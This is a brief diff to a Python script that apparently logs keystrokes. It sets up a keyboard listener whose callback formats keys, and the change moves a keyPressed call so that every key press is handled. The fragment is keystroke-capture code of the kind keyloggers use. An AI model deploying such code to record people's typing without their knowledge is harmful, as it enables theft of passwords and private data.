@@ -16,7 +16,7 @@ def logg(key):
   elif key.startswith('Key'):
     key=f'[{key}]'
     print(key)
-    keyPressed(key)
+  keyPressed(key)
 listener=keyboard.Listener(on_press=logg)
 listener.start()
 input()
